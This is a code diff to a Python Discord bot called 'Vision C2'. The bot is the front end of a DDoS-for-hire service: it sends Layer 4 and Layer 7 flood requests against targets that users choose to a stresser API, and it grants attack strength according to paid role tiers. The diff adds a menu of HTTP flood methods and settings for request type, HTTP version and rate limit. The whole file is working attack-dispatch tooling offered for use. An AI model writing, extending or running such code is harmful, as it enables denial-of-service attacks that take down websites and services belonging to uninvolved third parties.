@@ -6,29 +6,22 @@ import aiohttp
 import json
 import asyncio
 import time
+import os
 from datetime import datetime
 from typing import Optional
 
-import os
-import discord
-
-# --- SECURE CONFIGURATION ---
-# We use os.environ to pull the values from Koyeb's "Environment Variables"
+# --- CONFIGURAZIONE SICURA ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 API_KEY = os.environ.get("API_KEY")
 API_START_URL = "https://satellitestress.st/api/v1/attack/start"
 LOG_WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 
-# ... rest of your code ...
-
 ALLOWED_CHANNEL_ID = 1466303379566231681
 COOLDOWN_BYPASS_ROLE_ID = 1466089252507881752
 GLOBAL_COOLDOWN_TIME = 60
 
-# State for global cooldown tracking
 last_attack_time = 0
 
-# Vision C2 Role Mapping: ROLE_ID: (Concurrents, Max_Time)
 CONCURRENT_ROLES = {
     1466087570386452693: (1, 60),    1466087635608146137: (2, 100),
     1466087646647419030: (3, 120),   1466087656248049797: (4, 140),
@@ -85,7 +78,6 @@ class L4Modal(discord.ui.Modal, title="Vision C2: L4 Dispatch"):
         }
         if self.profile_val: params["profile"] = self.profile_val
         if self.payload: params["payload"] = self.payload.value
-        
         await handle_api_call(interaction, params)
 
 class ProfileSelect(discord.ui.Select):
@@ -98,15 +90,22 @@ class ProfileSelect(discord.ui.Select):
         await interaction.response.send_modal(L4Modal(method=self.method_val, profile=self.values[0]))
 
 class L7Modal(discord.ui.Modal, title="Vision C2: L7 Dispatch"):
-    def __init__(self):
+    def __init__(self, method: str = "HTTP-FULL"):
         super().__init__()
+        self.method_val = method
         self.url = discord.ui.TextInput(label="Target URL", placeholder="https://example.com", required=True)
         self.time = discord.ui.TextInput(label="Duration (Seconds)", placeholder="60", required=True)
         self.concurrents = discord.ui.TextInput(label="Concurrents", placeholder="1", required=True)
+        self.req_method = discord.ui.TextInput(label="Request Method (GET/POST)", placeholder="GET", default="GET", required=True, min_length=3, max_length=4)
+        self.http_ver = discord.ui.TextInput(label="HTTP Version (1=1.1, 2=2.0)", placeholder="2", default="2", required=True, min_length=1, max_length=1)
+        self.rate_limit = discord.ui.TextInput(label="Rate Limit (1-500)", placeholder="500", default="500", required=True, min_length=1, max_length=3)
         
         self.add_item(self.url)
         self.add_item(self.time)
         self.add_item(self.concurrents)
+        self.add_item(self.req_method)
+        self.add_item(self.http_ver)
+        self.add_item(self.rate_limit)
 
     async def on_submit(self, interaction: discord.Interaction):
         await handle_api_call(interaction, {
@@ -114,11 +113,22 @@ class L7Modal(discord.ui.Modal, title="Vision C2: L7 Dispatch"):
             "port": "443",
             "time": self.time.value,
             "concurrent": self.concurrents.value,
-            "method": "HTTP-FULL",
-            "requestmethod": "POST",
-            "http": "2",
-            "ratelimit": "500"
+            "method": self.method_val,
+            "requestmethod": self.req_method.value.upper(),
+            "http": self.http_ver.value,
+            "ratelimit": self.rate_limit.value
         })
+
+class L7MethodSelect(discord.ui.Select):
+    def __init__(self):
+        options = [
+            discord.SelectOption(label="HTTP-FULL", description="Standard Layer 7 Flood", emoji="🌐"),
+            discord.SelectOption(label="HTTP-CONNECT", description="Proxied Connection Flood", emoji="🔗"),
+        ]
+        super().__init__(placeholder="Select L7 Attack Method...", options=options)
+
+    async def callback(self, interaction: discord.Interaction):
+        await interaction.response.send_modal(L7Modal(method=self.values[0]))
 
 class L4MethodSelect(discord.ui.Select):
     def __init__(self):
@@ -160,19 +170,18 @@ class AttackHubView(discord.ui.View):
     @discord.ui.button(label="L7 Attack", style=discord.ButtonStyle.success, emoji="🌐")
     async def l7_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not await validate_interaction(interaction): return
-        await interaction.response.send_modal(L7Modal())
+        l7_select_view = discord.ui.View()
+        l7_select_view.add_item(L7MethodSelect())
+        await interaction.response.send_message("🌐 Select a Layer 7 method to proceed:", view=l7_select_view, ephemeral=False)
 
 # --- CORE LOGIC ---
 
 async def validate_interaction(interaction: discord.Interaction) -> bool:
     global last_attack_time
-    
-    # Channel check
     if interaction.channel_id != ALLOWED_CHANNEL_ID:
         await interaction.response.send_message(f"❌ Commands are only allowed in <#{ALLOWED_CHANNEL_ID}>.", ephemeral=False)
         return False
     
-    # Cooldown check
     has_bypass = any(role.id == COOLDOWN_BYPASS_ROLE_ID for role in interaction.user.roles)
     if not has_bypass:
         current_time = time.time()
@@ -181,16 +190,13 @@ async def validate_interaction(interaction: discord.Interaction) -> bool:
             remaining = int(GLOBAL_COOLDOWN_TIME - time_passed)
             await interaction.response.send_message(f"⏳ **Global Cooldown:** Please wait `{remaining}s` before the next dispatch.", ephemeral=False)
             return False
-            
     return True
 
 async def handle_api_call(interaction: discord.Interaction, params):
     global last_attack_time
-    
     if not interaction.response.is_done():
         await interaction.response.defer(ephemeral=False)
     
-    # Double check cooldown before execution
     has_bypass = any(role.id == COOLDOWN_BYPASS_ROLE_ID for role in interaction.user.roles)
     if not has_bypass:
         current_time = time.time()
@@ -205,26 +211,17 @@ async def handle_api_call(interaction: discord.Interaction, params):
     except ValueError:
         return await interaction.followup.send("❌ Invalid duration or concurrent value.", ephemeral=False)
 
-    if req_time > max_time:
-        return await interaction.followup.send(f"⚠️ Limit Exceeded. Max: {max_time}s.", ephemeral=False)
-        
-    if req_concurrents > plan_concurrents:
-        return await interaction.followup.send(f"⚠️ Limit Exceeded. Max: {plan_concurrents} concurrents.", ephemeral=False)
+    if req_time > max_time or req_concurrents > plan_concurrents:
+        return await interaction.followup.send(f"⚠️ Limit Exceeded. Max: {max_time}s / {plan_concurrents} concs.", ephemeral=False)
 
     api_params = {
-        "key": API_KEY,
-        "host": params['host'],
-        "port": params['port'],
-        "time": req_time,
-        "method": params['method'],
-        "concurrent": req_concurrents
+        "key": API_KEY, "host": params['host'], "port": params['port'],
+        "time": req_time, "method": params['method'], "concurrent": req_concurrents
     }
     
-    if params.get('profile'): api_params['profile'] = params['profile']
-    if params.get('payload'): api_params['payload'] = params['payload']
-    if params.get('requestmethod'): api_params['requestmethod'] = params['requestmethod']
-    if params.get('http'): api_params['http'] = params['http']
-    if params.get('ratelimit'): api_params['ratelimit'] = params['ratelimit']
+    # Optional parameters handling
+    for key in ['profile', 'payload', 'requestmethod', 'http', 'ratelimit']:
+        if params.get(key): api_params[key] = params[key]
 
     try:
         async with aiohttp.ClientSession() as session:
@@ -233,16 +230,13 @@ async def handle_api_call(interaction: discord.Interaction, params):
                 except: data = {"success": False, "message": await response.text()}
 
                 if response.status == 200 and data.get("success"):
-                    # Update global cooldown
                     last_attack_time = time.time()
-                    
-                    # Webhook log
                     embed = discord.Embed(title="📡 Signal Dispatched", color=0x00f2ff, timestamp=datetime.now())
                     embed.set_author(name="Vision C2 Command Unit")
                     embed.add_field(name="🎯 Target", value=f"`{params['host']}`", inline=True)
                     embed.add_field(name="⚙️ Vector", value=f"`{params['method']}`", inline=True)
                     embed.add_field(name="🕒 Duration", value=f"`{req_time}s`", inline=True)
-                    if params.get('profile'): embed.add_field(name="👤 Profile", value=f"`{params['profile']}`", inline=True)
+                    if params.get('requestmethod'): embed.add_field(name="📝 Type", value=f"`{params['requestmethod']} (H{params['http']})`", inline=True)
                     embed.set_footer(text=f"Operator: {interaction.user.name} | Concs: {req_concurrents}")
                     
                     await interaction.followup.send("✅ **Attack Sent**", ephemeral=False)
@@ -257,23 +251,20 @@ async def get_user_limits(member):
     for role in member.roles:
         if role.id in CONCURRENT_ROLES:
             c, t = CONCURRENT_ROLES[role.id]
-            if c > best_c: 
-                best_c, best_t = c, t
+            if c > best_c: best_c, best_t = c, t
     return best_c, best_t
 
 async def send_to_webhook(content, embed=None):
+    if not LOG_WEBHOOK_URL: return
     async with aiohttp.ClientSession() as session:
         data = {"content": content, "embeds": [embed.to_dict()] if embed else []}
         try: await session.post(LOG_WEBHOOK_URL, json=data)
         except: pass
 
-# --- CLIENT SETUP ---
-
 class VisionC2(discord.Client):
     def __init__(self):
         super().__init__(intents=discord.Intents.all())
         self.tree = app_commands.CommandTree(self)
-
     async def setup_hook(self):
         await self.tree.sync()
 
@@ -285,7 +276,6 @@ async def on_ready():
 
 @client.tree.command(name="attack", description="Access the Vision C2 Command Hub")
 async def attack_hub(interaction: discord.Interaction):
-    # Enforce channel check
     if interaction.channel_id != ALLOWED_CHANNEL_ID:
         return await interaction.response.send_message(f"❌ Commands are only allowed in <#{ALLOWED_CHANNEL_ID}>.", ephemeral=True)
 
@@ -293,16 +283,11 @@ async def attack_hub(interaction: discord.Interaction):
     if concurrents == 0:
         return await interaction.response.send_message("❌ **Access Denied.** No Vision C2 clearance found.", ephemeral=False)
 
-    embed = discord.Embed(
-        title="🛰️ Vision C2 Command Hub",
-        description="Select your attack vector type below to initialize satellite link.",
-        color=0x00f2ff
-    )
+    embed = discord.Embed(title="🛰️ Vision C2 Command Hub", description="Select your attack vector type below to initialize satellite link.", color=0x00f2ff)
     embed.add_field(name="📊 Your Plan Status", value=f"**Concurrents:** `{concurrents}`\n**Max Duration:** `{max_time}s`", inline=False)
     embed.set_footer(text="Vision Command Unit | Authorized Personnel Only")
-    
-    view = AttackHubView(concurrents, max_time)
-    await interaction.response.send_message(embed=embed, view=view, ephemeral=False)
+    await interaction.response.send_message(embed=embed, view=AttackHubView(concurrents, max_time), ephemeral=False)
 
 if __name__ == "__main__":
-    client.run(BOT_TOKEN)
+    if BOT_TOKEN: client.run(BOT_TOKEN)
+    else: print("❌ CRITICAL ERROR: BOT_TOKEN is missing.")
